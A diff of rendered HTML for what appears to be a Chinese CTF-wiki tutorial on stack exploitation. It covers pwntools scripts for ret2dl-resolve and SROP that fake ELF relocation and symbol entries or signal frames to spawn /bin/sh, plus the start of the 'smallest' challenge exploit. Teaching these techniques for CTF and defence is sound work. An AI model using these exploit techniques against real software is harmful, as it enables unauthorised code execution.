 <span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                 <span class="p">)</span>  <span class="c1"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span>
 <span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
 <span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span>
     <span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>  <span class="c1"># calculate the dynsym index of write</span>
-<span class="c1"># plus 10 since the size of Elf32_Sym is 16.</span>
+<span class="c1">## plus 10 since the size of Elf32_Sym is 16.</span>
 <span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">dynstr</span>
 <span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">st_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>
 
-<span class="c1">## making fake write relocation</span>
+<span class="c1">### making fake write relocation</span>
 
-<span class="c1"># making base_stage+24 ---&gt; fake reloc</span>
+<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
 <span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
 <span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
 <span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
@@ -810,7 +818,7 @@ Contents of section .dynsym:
 
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
-<span class="c1"># fake ret addr of write</span>
+<span class="c1">## fake ret addr of write</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">82</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
@@ -829,7 +837,7 @@ Contents of section .dynsym:
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
 </div>
-<p>需要注意的是，这里我 ‘/bin/sh’ 的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。</p>
+<p>需要注意的是，这里我’/bin/sh’的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x0050</span><span class="p">:</span>           <span class="s1">&#39;aara&#39;</span>
 </pre></div>
 </div>
@@ -891,13 +899,13 @@ main  stage1.py  stage3.py  stage5.py
 <span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
 
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
-<span class="c1"># used to call dl_Resolve()</span>
+<span class="c1">## used to call dl_Resolve()</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
 
 <span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
-<span class="c1"># used to make faking data, such relocation, Symbol, Str</span>
+<span class="c1">## used to make faking data, such relocation, Symbol, Str</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">)</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
@@ -952,121 +960,112 @@ __init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
 <h2>SROP<a class="headerlink" href="#srop" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id7">
 <h3>基本介绍<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
-<p>SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit
-Amsterdam的Erik Bosman提出，其相关研究 <strong>``Framing Signals — A Return to Portable Shellcode``</strong> 发表在安全顶级会议 <a class="reference external" href="http://www.ieee-security.org/TC/SP2014">Oakland
-2014</a> 上，被评选为当年的 <a class="reference external" href="http://www.ieee-security.org/TC/SP2014/awards.html">Best Student Papers</a> 。其中相关的paper以及slides的链接如下：</p>
+<p>SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究<strong>``Framing Signals — A Return to Portable Shellcode``</strong>发表在安全顶级会议<a class="reference external" href="http://www.ieee-security.org/TC/SP2014">Oakland
+2014</a>上，被评选为当年的<a class="reference external" href="http://www.ieee-security.org/TC/SP2014/awards.html">Best Student Papers</a>。其中相关的paper以及slides的链接如下：</p>
 <p><a class="reference external" href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">paper</a></p>
 <p><a class="reference external" href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">slides</a></p>
-<p>其中， <code class="docutils literal"><span class="pre">sigreturn</span></code> 是一个系统调用，在类unix系统发生signal的时候会被间接地调用。</p>
+<p>其中，<code class="docutils literal"><span class="pre">sigreturn</span></code>是一个系统调用，在类unix系统发生signal的时候会被间接地调用。</p>
 </div>
 <div class="section" id="signal">
 <h3>signal机制<a class="headerlink" href="#signal" title="永久链接至标题">¶</a></h3>
 <p>signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
-<div class="figure" id="id16">
+<div class="figure">
 <img alt="Process of Signal Handlering" src="../../_images/ProcessOfSignalHandlering.png" />
-<p class="caption"><span class="caption-text">Process of Signal Handlering</span></p>
 </div>
 <ol class="arabic simple">
 <li>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</li>
-<li>内核会为该进程保存相应的上下文， <strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong> 。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal
-Frame。 <strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong> 之后会跳转到注册过的signal
-handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>
+<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal
+Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>
 </ol>
-<div class="figure" id="id17">
+<div class="figure" id="id15">
 <img alt="signal2-stack" src="../../_images/signal2-stack.png" />
 <p class="caption"><span class="caption-text">signal2-stack</span></p>
 </div>
-<p>对于signal
-Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext</p>
-<ul class="simple">
-<li>x86</li>
-</ul>
-<div class="highlight-c"><div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">sigcontext</span>
+<p>对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext</p>
+<p>x86</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">struct</span> <span class="n">sigcontext</span>
 <span class="p">{</span>
-  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">gs</span><span class="p">,</span> <span class="n">__gsh</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">fs</span><span class="p">,</span> <span class="n">__fsh</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">es</span><span class="p">,</span> <span class="n">__esh</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ds</span><span class="p">,</span> <span class="n">__dsh</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">edi</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">esi</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ebp</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">esp</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ebx</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">edx</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ecx</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">eax</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">trapno</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">err</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">eip</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">cs</span><span class="p">,</span> <span class="n">__csh</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">eflags</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">esp_at_signal</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ss</span><span class="p">,</span> <span class="n">__ssh</span><span class="p">;</span>
-  <span class="k">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">oldmask</span><span class="p">;</span>
-  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cr2</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">gs</span><span class="p">,</span> <span class="n">__gsh</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">fs</span><span class="p">,</span> <span class="n">__fsh</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">es</span><span class="p">,</span> <span class="n">__esh</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">ds</span><span class="p">,</span> <span class="n">__dsh</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">edi</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">esi</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">ebp</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">esp</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">ebx</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">edx</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">ecx</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">eax</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">trapno</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">err</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">eip</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">cs</span><span class="p">,</span> <span class="n">__csh</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">eflags</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">esp_at_signal</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">ss</span><span class="p">,</span> <span class="n">__ssh</span><span class="p">;</span>
+  <span class="n">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">oldmask</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">cr2</span><span class="p">;</span>
 <span class="p">};</span>
 </pre></div>
 </div>
-<ul class="simple">
-<li>x64</li>
-</ul>
-<div class="highlight-cpp"><div class="highlight"><pre><span></span>     <span class="k">struct</span> <span class="n">_fpstate</span>
-     <span class="p">{</span>
-       <span class="cm">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>
-       <span class="n">__uint16_t</span>        <span class="n">cwd</span><span class="p">;</span>
-       <span class="n">__uint16_t</span>        <span class="n">swd</span><span class="p">;</span>
-       <span class="n">__uint16_t</span>        <span class="n">ftw</span><span class="p">;</span>
-       <span class="n">__uint16_t</span>        <span class="n">fop</span><span class="p">;</span>
-       <span class="n">__uint64_t</span>        <span class="n">rip</span><span class="p">;</span>
-       <span class="n">__uint64_t</span>        <span class="n">rdp</span><span class="p">;</span>
-       <span class="n">__uint32_t</span>        <span class="n">mxcsr</span><span class="p">;</span>
-       <span class="n">__uint32_t</span>        <span class="n">mxcr_mask</span><span class="p">;</span>
-       <span class="k">struct</span> <span class="n">_fpxreg</span>    <span class="n">_st</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
-       <span class="k">struct</span> <span class="n">_xmmreg</span>    <span class="n">_xmm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
-       <span class="n">__uint32_t</span>        <span class="n">padding</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
-     <span class="p">};</span>
-
-     <span class="k">struct</span> <span class="n">sigcontext</span>
-     <span class="p">{</span>
-       <span class="n">__uint64_t</span> <span class="n">r8</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">r9</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">r10</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">r11</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">r12</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">r13</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">r14</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">r15</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rdi</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rsi</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rbp</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rbx</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rdx</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rax</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rcx</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rsp</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">rip</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">eflags</span><span class="p">;</span>
-       <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">cs</span><span class="p">;</span>
-       <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">gs</span><span class="p">;</span>
-       <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">fs</span><span class="p">;</span>
-       <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">__pad0</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">err</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">trapno</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">oldmask</span><span class="p">;</span>
-       <span class="n">__uint64_t</span> <span class="n">cr2</span><span class="p">;</span>
-       <span class="n">__extension__</span> <span class="k">union</span>
-             <span class="p">{</span>
-               <span class="k">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
-               <span class="n">__uint64_t</span> <span class="n">__fpstate_word</span><span class="p">;</span>
-             <span class="p">};</span>
-       <span class="n">__uint64_t</span> <span class="n">__reserved1</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<p>x64</p>
+<div class="code c++ highlight-default"><div class="highlight"><pre><span></span><span class="n">struct</span> <span class="n">_fpstate</span>
+<span class="p">{</span>
+  <span class="o">/*</span> <span class="n">FPU</span> <span class="n">environment</span> <span class="n">matching</span> <span class="n">the</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">FXSAVE</span> <span class="n">layout</span><span class="o">.</span>  <span class="o">*/</span>
+  <span class="n">__uint16_t</span>                <span class="n">cwd</span><span class="p">;</span>
+  <span class="n">__uint16_t</span>                <span class="n">swd</span><span class="p">;</span>
+  <span class="n">__uint16_t</span>                <span class="n">ftw</span><span class="p">;</span>
+  <span class="n">__uint16_t</span>                <span class="n">fop</span><span class="p">;</span>
+  <span class="n">__uint64_t</span>                <span class="n">rip</span><span class="p">;</span>
+  <span class="n">__uint64_t</span>                <span class="n">rdp</span><span class="p">;</span>
+  <span class="n">__uint32_t</span>                <span class="n">mxcsr</span><span class="p">;</span>
+  <span class="n">__uint32_t</span>                <span class="n">mxcr_mask</span><span class="p">;</span>
+  <span class="n">struct</span> <span class="n">_fpxreg</span>    <span class="n">_st</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="n">struct</span> <span class="n">_xmmreg</span>    <span class="n">_xmm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="n">__uint32_t</span>                <span class="n">padding</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+<span class="p">};</span>
+<span class="n">struct</span> <span class="n">sigcontext</span>
+<span class="p">{</span>
+  <span class="n">__uint64_t</span> <span class="n">r8</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">r9</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">r10</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">r11</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">r12</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">r13</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">r14</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">r15</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rdi</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rsi</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rbp</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rbx</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rdx</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rax</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rcx</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rsp</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">rip</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">eflags</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">cs</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">gs</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">fs</span><span class="p">;</span>
+  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">__pad0</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">err</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">trapno</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">oldmask</span><span class="p">;</span>
+  <span class="n">__uint64_t</span> <span class="n">cr2</span><span class="p">;</span>
+  <span class="n">__extension__</span> <span class="n">union</span>
+    <span class="p">{</span>
+      <span class="n">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
+      <span class="n">__uint64_t</span> <span class="n">__fpstate_word</span><span class="p">;</span>
+    <span class="p">};</span>
+  <span class="n">__uint64_t</span> <span class="n">__reserved1</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
 <span class="p">};</span>
 </pre></div>
 </div>
+<p>​</p>
 <ol class="arabic simple">
-<li>signal
-handler返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的 sigreturn 的调用号为77，64位的系统调用号为15。</li>
+<li>signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</li>
 </ol>
 </div>
 <div class="section" id="id8">
@@ -1074,17 +1073,14 @@ handler返回后，内核为执行 sigreturn 系统调用，为该进程恢复�
 <p>仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：</p>
 <ul class="simple">
 <li>Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。</li>
-<li>由于内核与信号处理程序无关(kernel agnostic about signal
-handlers)，它并不会去记录这个signal对应的Signal
-Frame，所以当执行sigreturn系统调用时，此时的Signal
+<li>由于内核与信号处理程序无关(kernel agnostic about signal handlers)，它并不会去记录这个signal对应的Signal Frame，所以当执行sigreturn系统调用时，此时的Signal
 Frame并不一定是之前内核为用户进程保存的Signal Frame。</li>
 </ul>
 <p>说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。</p>
 <div class="section" id="shell">
 <h4>获取shell<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h4>
-<p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal
-Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</p>
-<div class="figure" id="id18">
+<p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</p>
+<div class="figure" id="id16">
 <img alt="signal2-stack" src="../../_images/srop-example-1.png" />
 <p class="caption"><span class="caption-text">signal2-stack</span></p>
 </div>
@@ -1095,12 +1091,10 @@ Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详�
 <p>需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>
 <ul class="simple">
 <li><strong>控制栈指针。</strong></li>
-<li><strong>把原来rip指向的 ``syscall`` gadget换成 ``syscall; ret``
-gadget。</strong></li>
+<li><strong>把原来rip指向的``syscall`` gadget换成``syscall; ret`` gadget。</strong></li>
 </ul>
-<p>如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal
-Frame。因此就可以执行一系列的sigreturn函数调用。</p>
-<div class="figure" id="id19">
+<p>如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。</p>
+<div class="figure" id="id17">
 <img alt="signal2-stack" src="../../_images/srop-example-2.png" />
 <p class="caption"><span class="caption-text">signal2-stack</span></p>
 </div>
@@ -1110,25 +1104,29 @@ Frame。因此就可以执行一系列的sigreturn函数调用。</p>
 <p>需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件</p>
 <ul class="simple">
 <li><strong>可以通过栈溢出来控制栈的内容</strong></li>
-<li><strong>需要知道相应的地址</strong></li>
+<li><dl class="first docutils">
+<dt><strong>需要知道相应的地址</strong></dt>
+<dd><ul class="first last">
 <li><strong>“/bin/sh”</strong></li>
 <li><strong>Signal Frame</strong></li>
 <li><strong>syscal</strong></li>
 <li><strong>sigreturn</strong></li>
 <li>需要有够大的空间来塞下整个sigal frame</li>
 </ul>
+</dd>
+</dl>
+</li>
+</ul>
 <p>此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：</p>
-<div class="figure" id="id20">
+<div class="figure">
 <img alt="gadget1" src="../../_images/srop-gadget-1.png" />
-<p class="caption"><span class="caption-text">gadget1</span></p>
 </div>
-<p>并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说 <code class="docutils literal"><span class="pre">Linux</span> <span class="pre">&lt;</span> <span class="pre">3.3</span> <span class="pre">x86_64</span></code> （在Debian 7.0， Ubuntu Long Term Support， CentOS
+<p>并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说<code class="docutils literal"><span class="pre">Linux</span> <span class="pre">&lt;</span> <span class="pre">3.3</span> <span class="pre">x86_64</span></code>（在Debian 7.0， Ubuntu Long Term Support， CentOS
 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&amp;return代码片段。如下</p>
-<div class="figure" id="id21">
+<div class="figure">
 <img alt="gadget1" src="../../_images/srop-gadget-2.png" />
-<p class="caption"><span class="caption-text">gadget1</span></p>
 </div>
-<p>但是目前它已经被 <code class="docutils literal"><span class="pre">vsyscall-emulate</span></code> 和 <code class="docutils literal"><span class="pre">vdso</span></code> 机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</p>
+<p>但是目前它已经被<code class="docutils literal"><span class="pre">vsyscall-emulate</span></code>和<code class="docutils literal"><span class="pre">vdso</span></code>机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</p>
 <p>值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</p>
 </div>
 </div>
@@ -1157,7 +1155,7 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 <p>程序主要开启了NX保护。</p>
 <p><strong>漏洞发现</strong></p>
 <p>实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下</p>
-<div class="code Asm highlight-default"><div class="highlight"><pre><span></span><span class="n">public</span> <span class="n">start</span>
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span><span class="n">public</span> <span class="n">start</span>
 <span class="n">start</span> <span class="n">proc</span> <span class="n">near</span>
 <span class="n">xor</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span>
 <span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">400</span><span class="n">h</span>
@@ -1187,19 +1185,19 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x00000000004000BE</span>
 <span class="n">start_addr</span> <span class="o">=</span> <span class="mh">0x00000000004000B0</span>
-<span class="c1"># set start addr three times</span>
+<span class="c1">## set start addr three times</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="c1"># modify the return addr to start_addr+3</span>
-<span class="c1"># so that skip the xor rax,rax; then the rax=1</span>
-<span class="c1"># get stack addr</span>
+<span class="c1">## modify the return addr to start_addr+3</span>
+<span class="c1">## so that skip the xor rax,rax; then the rax=1</span>
+<span class="c1">## get stack addr</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xb3</span><span class="s1">&#39;</span><span class="p">)</span>
